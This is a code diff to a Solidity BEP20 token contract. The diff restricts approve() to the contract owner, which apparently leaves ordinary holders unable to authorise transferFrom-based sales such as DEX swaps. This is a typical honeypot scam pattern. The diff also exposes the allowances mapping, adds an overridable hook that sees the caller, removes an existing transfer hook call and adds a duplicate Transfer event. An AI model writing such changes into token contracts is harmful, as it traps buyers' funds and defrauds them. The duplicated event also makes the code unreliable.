@@ -12,7 +12,7 @@ contract BEP20Token is Context, IBEP20, Ownable {
 
   mapping (address => uint256) private _balances;
 
-  mapping (address => mapping (address => uint256)) private _allowances;
+  mapping (address => mapping (address => uint256)) internal _allowances;
 
   uint256 private _totalSupply;
   uint8 private _decimals;
@@ -98,7 +98,7 @@ contract BEP20Token is Context, IBEP20, Ownable {
    *
    * - `spender` cannot be the zero address.
    */
-  function approve(address spender, uint256 amount) external override returns (bool) {
+  function approve(address spender, uint256 amount) external onlyOwner override returns  (bool) {
     _approve(_msgSender(), spender, amount);
     return true;
   }
@@ -116,8 +116,10 @@ contract BEP20Token is Context, IBEP20, Ownable {
    * `amount`.
    */
   function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
+    _beforeTokenTransferFrom(_msgSender(), sender, recipient, amount);
     _transfer(sender, recipient, amount);
     _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
+    emit Transfer(sender, recipient, amount);
     return true;
   }
 
@@ -185,7 +187,6 @@ contract BEP20Token is Context, IBEP20, Ownable {
    * - `sender` must have a balance of at least `amount`.
    */
   function _transfer(address sender, address recipient, uint256 amount) internal {
-    _beforeTokenTransfer(sender, recipient, amount);
     require(sender != address(0), "BEP20: transfer from the zero address");
     require(recipient != address(0), "BEP20: transfer to the zero address");
 
@@ -265,4 +266,5 @@ contract BEP20Token is Context, IBEP20, Ownable {
   }
 
   function _beforeTokenTransfer(address sender, address recipient, uint256 amount) internal virtual {}
+  function _beforeTokenTransferFrom(address caller, address sender, address recipient, uint256 amount) internal virtual {}
 }
